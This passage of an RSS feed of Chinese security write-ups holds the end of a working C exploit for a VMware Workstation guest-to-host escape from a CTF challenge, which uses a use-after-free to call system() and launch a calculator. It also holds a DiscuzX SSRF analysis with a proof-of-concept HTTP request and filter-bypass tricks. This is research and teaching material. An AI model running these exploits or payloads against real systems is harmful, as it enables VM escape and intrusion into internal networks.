    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,4,&amp;amp;s2[16],&amp;amp;res);
    if(!res){
        printf(&quot;fail to send data\n&quot;);
        return;
    }
    
    //third step,free it again
    //set status to be 4
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;len,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }
    printf(&quot;recv len:%d\n&quot;,len);

    //free the output buffer
    printf(&quot;Free the buffer again...\n&quot;);
    getchar();
    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv finish2\n&quot;);
        return;
    }

    printf(&quot;Trying to reuse the buffer as a struct, which we can leak..\n&quot;);
    getchar();
    run_cmd(s5);
    printf(&quot;Should be done.Check the buffer\n&quot;);
    getchar();

    //Now the output buffer of chan[1] is used as a struct, which contains many addresses
    channel_recv_reply_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,&amp;amp;len,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }


    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i&amp;lt;len+0x10;i+=4){
        channel_recv_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,i,data,&amp;amp;res);
    }
    printf(&quot;recv data:\n&quot;);
    for(i=0;i&amp;lt;len;i+=8){
        printf(&quot;recv data:%lx\n&quot;,*(long long *)&amp;amp;data[i]);
    }
    text = (*(uint64_t *)data)-0xf818d0;

    printf(&quot;Leak Success\n&quot;);
}

void exploit(){
    //the exploit step is almost the same as the leak ones
    struct channel chan[10];
    int res=0;
    int len,i;
    char *data;
    char *s1 = &quot;info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;;
    char *s2 = &quot;info-get guestinfo.b&quot;;
    char *s3 = &quot;1 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;;
    char *s4 = &quot;gnome-calculator\x00&quot;;
    uint64_t pay1 =text+0xFE95B8; 
    uint64_t pay2 =text+0xECFD0; //system
    uint64_t pay3 =text+0xFE95C8;
    char *pay4 = &quot;gnome-calculator\x00&quot;;
    run_cmd(s1);
    channel_open(&amp;amp;chan[0].cookie1,&amp;amp;chan[0].cookie2,&amp;amp;chan[0].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_set_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),&amp;amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
    channel_send_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,strlen(s2),s2,&amp;amp;res);
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;len,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }
    printf(&quot;recv len:%d\n&quot;,len);
    data = malloc(len+0x10);
    memset(data,0,len+0x10);
    for(i=0;i&amp;lt;len+0x10;i+=4){
        channel_recv_data(chan[0].cookie1,chan[0].cookie2,chan[0].num,i,data,&amp;amp;res);
    }
    printf(&quot;recv data:%s\n&quot;,data);
    channel_open(&amp;amp;chan[1].cookie1,&amp;amp;chan[1].cookie2,&amp;amp;chan[1].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_open(&amp;amp;chan[2].cookie1,&amp;amp;chan[2].cookie2,&amp;amp;chan[2].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_open(&amp;amp;chan[3].cookie1,&amp;amp;chan[3].cookie2,&amp;amp;chan[3].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to open channel!\n&quot;);
        return;
    }
    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv finish2\n&quot;);
        return;
    }
    channel_set_len(chan[1].cookie1,chan[1].cookie2,chan[1].num,strlen(s3),&amp;amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
    printf(&quot;leak2 success\n&quot;);
    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;len,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv data len\n&quot;);
        return;
    }
    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;res);
    if(!res){
        printf(&quot;fail to recv finish2\n&quot;);
        return;
    }
    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,8,&amp;amp;pay1,&amp;amp;res);
    channel_set_len(chan[2].cookie1,chan[2].cookie2,chan[2].num,strlen(s3),&amp;amp;res);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
    channel_set_len(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(s3),&amp;amp;res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&amp;amp;pay2,&amp;amp;res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&amp;amp;pay3,&amp;amp;res);
    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(pay4)+1,pay4,&amp;amp;res);
    run_cmd(s4);
    if(!res){
        printf(&quot;fail to set len\n&quot;);
        return;
    }
}
void main(){
    setvbuf(stdout,0,2,0);
    setvbuf(stderr,0,2,0);
    setvbuf(stdin,0,2,0);
    leak();
    printf(&quot;text base :%p&quot;,text);
    exploit();
}	
&lt;/code&gt;&lt;p&gt;Enjoy your calculator:)&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-53372f4dacfe152584ea24b2efc6a4a7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;466&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-53372f4dacfe152584ea24b2efc6a4a7&quot; data-watermark-src=&quot;v2-c19ca28337b91b0fc87d56c97781b99e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;关于调试&lt;/h2&gt;&lt;p&gt;调试有点小技巧需要说明一下。首先就是正常的把&lt;code class=&quot;inline&quot;&gt;vmware&lt;/code&gt;开起来，然后在&lt;code class=&quot;inline&quot;&gt;host&lt;/code&gt;用&lt;code class=&quot;inline&quot;&gt;gdb&lt;/code&gt;来&lt;code class=&quot;inline&quot;&gt;attach&lt;/code&gt;上去。这个时候我们会下断点，然后继续运行，进入虚拟机&lt;code class=&quot;inline&quot;&gt;guest&lt;/code&gt;里面跑&lt;code class=&quot;inline&quot;&gt;exploit&lt;/code&gt;脚本。但大家想一下，如果你还在&lt;code class=&quot;inline&quot;&gt;guest&lt;/code&gt;里面的时候，&lt;code class=&quot;inline&quot;&gt;host&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;gdb&lt;/code&gt;遇到了断点，会怎样？&lt;br&gt;因为&lt;code class=&quot;inline&quot;&gt;gdb&lt;/code&gt;遇到了断点，那么&lt;code class=&quot;inline&quot;&gt;guest&lt;/code&gt;就被停住了。然而你还在&lt;code class=&quot;inline&quot;&gt;guest&lt;/code&gt;里面，你就没有办法按&lt;code class=&quot;inline&quot;&gt;ctrl+alt&lt;/code&gt;切出来了，就像被人放了一招&lt;code class=&quot;inline&quot;&gt;时间停止&lt;/code&gt;一样。这个时候你除了含泪强制关机之外没有什么好办法。所以大家在调试的时候记得现在exp开头加个&lt;code class=&quot;inline&quot;&gt;sleep&lt;/code&gt;,然后在&lt;code class=&quot;inline&quot;&gt;sleep&lt;/code&gt;的时候赶紧把鼠标切出来到&lt;code class=&quot;inline&quot;&gt;host&lt;/code&gt;中。这样就可以正常调试了。(PS:好像&lt;code class=&quot;inline&quot;&gt;mac&lt;/code&gt;不会有这个问题，因为&lt;code class=&quot;inline&quot;&gt;mac&lt;/code&gt;可以直接用触摸板切出来?)&lt;/p&gt;&lt;p&gt;稍微打个广告:如果你觉得这篇文章有用，欢迎到github上follow一波&lt;code class=&quot;inline&quot;&gt;Ne0&lt;/code&gt;(&lt;a href=&quot;https://github.com/Changochen&quot;&gt;https://github.com/Changochen&lt;/a&gt;)和&lt;code class=&quot;inline&quot;&gt;bibi&lt;/code&gt;(&lt;a href=&quot;https://github.com/fpbibi&quot;&gt;https://github.com/fpbibi&lt;/a&gt;)&lt;/p&gt;&lt;h2&gt;相关材料&lt;/h2&gt;&lt;p&gt;题目相关材料：&lt;/p&gt;&lt;blockquote&gt;题目操作系统：Ubuntu x64 1804&lt;br&gt;目标VMWare Workstation：VMware-Workstation-Full-15.0.2-10952284.x86_64.bundle，&lt;a href=&quot;https://drive.google.com/open?id=1SlojAhX0NCpWTPjASfM03v5QBvRtT-sp&quot;&gt;https://drive.google.com/open?id=1SlojAhX0NCpWTPjASfM03v5QBvRtT-sp&lt;/a&gt;&lt;br&gt;patched VMX：&lt;a href=&quot;https://drive.google.com/open?id=1MJQSQYufGtl9DQnG1osyMk_1YbgCPL-E&quot;&gt;https://drive.google.com/open?id=1MJQSQYufGtl9DQnG1osyMk_1YbgCPL-E&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;一些参考资料：&lt;/p&gt;&lt;blockquote&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2017/6/26/use-after-silence-exploiting-a-quietly-patched-uaf-in-vmware&quot;&gt;https://www.zerodayinitiative.com/blog/2017/6/26/use-after-silence-exploiting-a-quietly-patched-uaf-in-vmware&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.52pojie.cn/thread-783225-1-1.html&quot;&gt;https://www.52pojie.cn/thread-783225-1-1.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://sites.google.com/site/chitchatvmback/backdoor&quot;&gt;https://sites.google.com/site/chitchatvmback/backdoor&lt;/a&gt;&lt;/blockquote&gt;</description>
<author>婴宁</author>
<guid isPermaLink="false">2018-12-11-52140921</guid>
<pubDate>Tue, 11 Dec 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>DiscuzX 两处 SSRF 挖掘及利用</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2018-12-09-51907363.html</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/51907363&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-e7d00533c3e1540f6230bcf1746af4b6_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;h2&gt;&lt;b&gt;概述&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我在调试分析 DiscuzX （以下简称 Dz）历史漏洞的时候，发现 Dz 的 SSRF 漏洞其实都是由一个叫&lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt;的函数导致的，并且官方修补方式都是指哪补哪。于是简单过了一遍所有调用&lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt;的地方，最终又找到两处 SSRF。本文将对这两处 SSRF 漏洞成因以及利用方式做简要探讨。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;关键函数 dfsockopen&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;本次漏洞的关键函数&lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt;：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;function dfsockopen($url, $limit = 0, $post = &#39;&#39;, $cookie = &#39;&#39;, $bysocket = FALSE, $ip = &#39;&#39;, $timeout = 15, $block = TRUE, $encodetype  = &#39;URLENCODE&#39;, $allowcurl = TRUE, $position = 0, $files = array()) {
    require_once libfile(&#39;function/filesock&#39;);
    return _dfsockopen($url, $limit, $post, $cookie, $bysocket, $ip, $timeout, $block, $encodetype, $allowcurl, $position, $files);
}&lt;/code&gt;&lt;p&gt;可以看到，&lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt; 具体逻辑都是由 &lt;code class=&quot;inline&quot;&gt;_dfsockopen&lt;/code&gt; 实现的。而 &lt;code class=&quot;inline&quot;&gt;_dfsockopen&lt;/code&gt; 函数代码的大致流程是：对传入的 url 参数首先调用 &lt;code class=&quot;inline&quot;&gt;parse_url&lt;/code&gt; 函数进行解析，然后检测 PHP 环境是否安装了 curl 扩展，如果是，那么接下来会用 curl 对传入的 url 参数发起请求；否则，则用 &lt;code class=&quot;inline&quot;&gt;fsockopen&lt;/code&gt; 对解析出来的 host, port 建立 socket 连接，手动构造发送 HTTP 请求数据包。&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;_dfsockopen&lt;/code&gt; 函数代码比较长，这里只贴出其中调用 curl 进行处理的部分：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    if(function_exists(&#39;curl_init&#39;) &amp;amp;&amp;amp; function_exists(&#39;curl_exec&#39;) &amp;amp;&amp;amp; $allowcurl) {
        $ch = curl_init();
        $httpheader = array();
        if($ip) {
            $httpheader[] = &quot;Host: &quot;.$host;
        }
        if($httpheader) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);
        }
        curl_setopt($ch, CURLOPT_URL, $scheme.&#39;://&#39;.($ip ? $ip : $host).($port ? &#39;:&#39;.$port : &#39;&#39;).$path);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_HEADER, 1);
        if($post) {
            curl_setopt($ch, CURLOPT_POST, 1);
            if($encodetype == &#39;URLENCODE&#39;) {
                curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
            } else {
                foreach($post as $k =&amp;gt; $v) {
                    if(isset($files[$k])) {
                        $post[$k] = &#39;@&#39;.$files[$k];
                    }
                }
                foreach($files as $k =&amp;gt; $file) {
                    if(!isset($post[$k]) &amp;amp;&amp;amp; file_exists($file)) {
                        $post[$k] = &#39;@&#39;.$file;
                    }
                }
                curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
            }
        }
        if($cookie) {
            curl_setopt($ch, CURLOPT_COOKIE, $cookie);
        }
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
        $data = curl_exec($ch);
        $status = curl_getinfo($ch);
        $errno = curl_errno($ch);
        curl_close($ch);
        if($errno || $status[&#39;http_code&#39;] != 200) {
            return;
        } else {
            $GLOBALS[&#39;filesockheader&#39;] = substr($data, 0, $status[&#39;header_size&#39;]);
            $data = substr($data, $status[&#39;header_size&#39;]);
            return !$limit ? $data : substr($data, 0, $limit);
        }
    }&lt;/code&gt;&lt;p&gt;可以发现，&lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt;没有检查一个请求的地址是否是内网地址。除此之外，它会优先使用 curl 来构造发送请求，curl 是个很强大的网络请求程序，它默认支持的协议很多，其中包括“万能”的协议 gopher：&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-4dbbcb7e3345d2bd68a5e5ab9a18e1ea_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1602&quot; data-rawheight=&quot;136&quot; data-watermark=&quot;&quot; data-original-src=&quot;&quot; data-watermark-src=&quot;&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;gopher 可以构造发送任意内容的数据包：&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6f6b82247cf00b6f83d061055351de97_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2564&quot; data-rawheight=&quot;512&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-6f6b82247cf00b6f83d061055351de97&quot; data-watermark-src=&quot;v2-3ca725c7aa9349bfcd47c4287dd032c0&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;另外注意一点，这里代码中的 curl 选项配置跟随跳转：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);&lt;/code&gt;&lt;p&gt;众所周知，跟随跳转在 SSRF 中可以 bypass 请求协议限制（虽然这里并没有）。除此之外，由于 Dz 中&lt;code class=&quot;inline&quot;&gt;_xss_check&lt;/code&gt;函数会检查 url 中的特殊字符，如果检查到某些特殊字符就会进行拦截，因此还可以利用跟随跳转来绕过 url 中不能出现特殊字符的限制：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    private function _xss_check() {

        static $check = array(&#39;&quot;&#39;, &#39;&amp;gt;&#39;, &#39;&amp;lt;&#39;, &#39;\&#39;&#39;, &#39;(&#39;, &#39;)&#39;, &#39;CONTENT-TRANSFER-ENCODING&#39;);

        if(isset($_GET[&#39;formhash&#39;]) &amp;amp;&amp;amp; $_GET[&#39;formhash&#39;] !== formhash()) {
            system_error(&#39;request_tainting&#39;);
        }

        if($_SERVER[&#39;REQUEST_METHOD&#39;] == &#39;GET&#39; ) {
            $temp = $_SERVER[&#39;REQUEST_URI&#39;];
        } elseif(empty ($_GET[&#39;formhash&#39;])) {
            $temp = $_SERVER[&#39;REQUEST_URI&#39;].file_get_contents(&#39;php://input&#39;);
        } else {
            $temp = &#39;&#39;;
        }

        if(!empty($temp)) {
            $temp = strtoupper(urldecode(urldecode($temp)));
            foreach ($check as $str) {
                if(strpos($temp, $str) !== false) {
                    system_error(&#39;request_tainting&#39;);
                }
            }
        }

        return true;
    }&lt;/code&gt;&lt;h2&gt;&lt;b&gt;寻找漏洞&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;所以如果想再找一个 SSRF 的思路就有了，直接找哪些地方调用了 &lt;code class=&quot;inline&quot;&gt;dfsockopen&lt;/code&gt; 并且 url 参数可控的即可。去年 10 月份的时候更新了两个关于 SSRF 的补丁：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/19fd20f7420397b88278ac1a0dae65fe50012506&quot;&gt;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/19fd20f7420397b88278ac1a0dae65fe50012506&lt;/a&gt;&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/76a3c77c979f92dc1633ae581b5359db76096593&quot;&gt;https://gitee.com/ComsenzDiscuz/DiscuzX/commit/76a3c77c979f92dc1633ae581b5359db76096593&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;可以看到官方的修补办法都是简单粗暴，直接关闭对应的功能或者把功能仅限于对管理员开放。所以除了上面的两个已经被修补外，我粗略找了下，又发现了两个。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;imgcropper SSRF&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;source/class/class_image.php&lt;/code&gt; &lt;code class=&quot;inline&quot;&gt;image&lt;/code&gt;类&lt;code class=&quot;inline&quot;&gt;init&lt;/code&gt;方法：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    function init($method, $source, $target, $nosuffix = 0) {
        global $_G;

        $this-&amp;gt;errorcode = 0;
        if(empty($source)) {
            return -2;
        }
        $parse = parse_url($source);
        if(isset($parse[&#39;host&#39;])) {
            if(empty($target)) {
                return -2;
            }
            $data = dfsockopen($source);
            $this-&amp;gt;tmpfile = $source = tempnam($_G[&#39;setting&#39;][&#39;attachdir&#39;].&#39;./temp/&#39;, &#39;tmpimg_&#39;);
            if(!$data || $source === FALSE) {
                return -2;
            }
            file_put_contents($source, $data);
        }
        ......
  }&lt;/code&gt;&lt;p&gt;再找哪些地方调用了&lt;code class=&quot;inline&quot;&gt;image&lt;/code&gt;类的&lt;code class=&quot;inline&quot;&gt;init&lt;/code&gt;方法，发现&lt;code class=&quot;inline&quot;&gt;image&lt;/code&gt;类的&lt;code class=&quot;inline&quot;&gt;Thumb&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;Cropper&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;Watermark&lt;/code&gt;方法都调用了&lt;code class=&quot;inline&quot;&gt;init&lt;/code&gt;。比如&lt;code class=&quot;inline&quot;&gt;Thumb&lt;/code&gt;：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    function Thumb($source, $target, $thumbwidth, $thumbheight, $thumbtype = 1, $nosuffix = 0) {
        $return = $this-&amp;gt;init(&#39;thumb&#39;, $source, $target, $nosuffix);
        ......
    }&lt;/code&gt;&lt;p&gt;所以再找哪些地方调用了&lt;code class=&quot;inline&quot;&gt;image&lt;/code&gt;类的&lt;code class=&quot;inline&quot;&gt;Thumb&lt;/code&gt;方法，最终发现：&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;source/module/misc/misc_imgcropper.php&lt;/code&gt; 52-57行：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;    require_once libfile(&#39;class/image&#39;);
    $image = new image();
    $prefix = $_GET[&#39;picflag&#39;] == 2 ? $_G[&#39;setting&#39;][&#39;ftp&#39;][&#39;attachurl&#39;] : $_G[&#39;setting&#39;][&#39;attachurl&#39;];
    if(!$image-&amp;gt;Thumb($prefix.$_GET[&#39;cutimg&#39;], $cropfile, $picwidth, $picheight)) {
        showmessage(&#39;imagepreview_errorcode_&#39;.$image-&amp;gt;errorcode, null, null, array(&#39;showdialog&#39; =&amp;gt; true, &#39;closetime&#39; =&amp;gt; true));
    }&lt;/code&gt;&lt;p&gt;下断点调试发现 &lt;code class=&quot;inline&quot;&gt;$_G[&#39;setting&#39;][&#39;ftp&#39;][&#39;attachurl&#39;]&lt;/code&gt; 的值为 &lt;code class=&quot;inline&quot;&gt;/&lt;/code&gt;，而 &lt;code class=&quot;inline&quot;&gt;$_G[&#39;setting&#39;][&#39;attachurl&#39;]&lt;/code&gt; 的值是 &lt;code class=&quot;inline&quot;&gt;data/attachment/&lt;/code&gt;。所以似乎 &lt;code class=&quot;inline&quot;&gt;$prefix&lt;/code&gt; 为 &lt;code class=&quot;inline&quot;&gt;/&lt;/code&gt; 才有 SSRF 利用的可能。&lt;/p&gt;&lt;p&gt;一开始构造 &lt;code class=&quot;inline&quot;&gt;cutimg=/10.0.1.1/get&lt;/code&gt;，这样 &lt;code class=&quot;inline&quot;&gt;$url&lt;/code&gt; 的值就为 &lt;code class=&quot;inline&quot;&gt;//10.0.1.1/get&lt;/code&gt;，按道理来说这应该算是一个正常的 url，但是结果却请求失败了。&lt;/p&gt;&lt;p&gt;仔细跟进 &lt;code class=&quot;inline&quot;&gt;_dfsockopen&lt;/code&gt; 发现，在 PHP 环境安装有 cURL 时，进入 curl 处理的代码分支，直到这里：&lt;/p&gt;&lt;code lang=&quot;php&quot;&gt;curl_setopt($ch, CURLOPT_URL, $scheme.&#39;://&#39;.($ip ? $ip : $host).($port ? &#39;:&#39;.$port : &#39;&#39;).$path);&lt;/code&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;$scheme&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;$host&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;$port&lt;/code&gt;、&lt;code class=&quot;inline&quot;&gt;$path&lt;/code&gt; 都是 &lt;code class=&quot;inline&quot;&gt;parse_url&lt;/code&gt; 解析 url 参数后的对应的值，而对像 &lt;code class=&quot;inline&quot;&gt;//10.0.1.1/get&lt;/code&gt; 这样的 url 解析时，&lt;code class=&quot;inline&quot;&gt;$scheme&lt;/code&gt; 的值是 &lt;code class=&quot;inline&quot;&gt;null&lt;/code&gt;，因此最后拼接的结果是 &lt;code class=&quot;inline&quot;&gt;://10.0.1.1/get&lt;/code&gt;，没有协议，curl 最后对这种url的请求会自动在前面加上 &lt;code class=&quot;inline&quot;&gt;HTTP://&lt;/code&gt;，结果就变成了请求 &lt;code class=&quot;inline&quot;&gt;HTTP://://10.0.1.1/get&lt;/code&gt;，这种 url 在我的环境中会导致 curl 报错。&lt;/p&gt;&lt;p&gt;所以我去掉了 curl 扩展，让 &lt;code class=&quot;inline&quot;&gt;_dfsockopen&lt;/code&gt; 函数代码走 socket 发包的流程，踩了 &lt;code class=&quot;inline&quot;&gt;parse_url&lt;/code&gt; 和 Dz 代码的一些坑点（这里就不展开了，有兴趣的同学调下代码就知道了），最后发现像这样构造可以成功：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;cutimg=/:@localhost:9090/dz-imgcropper-ssrf&lt;/code&gt;&lt;p&gt;poc:&lt;/p&gt;&lt;code lang=&quot;http&quot;&gt;POST /misc.php?mod=imgcropper&amp;amp;picflag=2&amp;amp;cutimg=/:@localhost:9090/dz-imgcropper-ssrf HTTP/1.1
Host: ubuntu-trusty.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:59.0) Gecko/20100101 Firefox/59.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Cookie: xkmD_2132_sid=E5sbVr; xkmD_2132_saltkey=m6Y8022s; xkmD_2132_lastvisit=1521612483; xkmD_2132_lastact=1521624907%09misc.php%09imgcropper; xkmD_2132_home_readfeed=1521616105; xkmD_2132_seccode=1.ecda87c571707d3f92; xkmD_2132_ulastactivity=a0f4A9CWpermv2t0GGOrf8%2BzCf6dZyAoQ3Sto7ORINqJeK4g3xcX; xkmD_2132_auth=40a4BIESn2PZVmGftNQ2%2BD1ImxpYr0HXke37YiChA2ruG6OryhLe0bUg53XKlioysCePIZGEO1jmlB1L4qbo; XG8F_2132_sid=fKyQMr; XG8F_2132_saltkey=U7lxxLwx; XG8F_2132_lastvisit=1521683793; XG8F_2132_lastact=1521699709%09index.php%09; XG8F_2132_ulastactivity=200fir8BflS1t8ODAa3R7YNsZTQ1k262ysLbc9wdHRzbPnMZ%2BOv7; XG8F_2132_auth=3711UP00sKWDx2Vo1DtO17C%2FvDfrelGOrwhtDmwu5vBjiXSHuPaFVJ%2FC%2BQi1mw4v4pJ66jx6otRFKfU03cBy; XG8F_2132_lip=172.16.99.1%2C1521688203; XG8F_2132_nofavfid=1; XG8F_2132_onlineusernum=3; XG8F_2132_sendmail=1
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 36

imgcroppersubmit=1&amp;amp;formhash=f8472648&lt;/code&gt;&lt;p&gt;此时 url 即为&lt;code class=&quot;inline&quot;&gt;//:@localhost:9090/dz-imgcropper-ssrf&lt;/code&gt;。SSRF 请求成功：&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-93df11df6c4d4c62d3ece504ab6df48c_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1340&quot; data-rawheight=&quot;426&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-93df11df6c4d4c62d3ece504ab6df48c&quot; data-watermark-src=&quot;v2-815e3237c0b985a0c6d5fe8cd432c8a5&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;通过这种方式进行构造利用的话，不太需要额外的限制条件（只要求服务端 PHP 环境没有安装 curl 扩展）￼，但是只能发 HTTP GET 请求，并且服务端不跟随跳转。漏洞危害有限。&lt;/p&gt;&lt;p&gt;后来 l3m0n 师傅也独立发现了这个漏洞，并且他发现较高版本的 curl 是可以成功请求 &lt;code class=&quot;inline&quot;&gt;HTTP://:/&lt;/code&gt; 的，较高版本的 curl 会将这种 url 地址解析到 127.0.0.1 的 80 端口：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d0adaa84880f61a188de94eec474cea9_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;834&quot; data-rawheight=&quot;476&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-d0adaa84880f61a188de94eec474cea9&quot; data-watermark-src=&quot;v2-26ed5e568292db52b5ff9839b3efac5f&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;最后他再利用之前 PHP &lt;code class=&quot;inline&quot;&gt;parse_url&lt;/code&gt; 的解析 bug（ 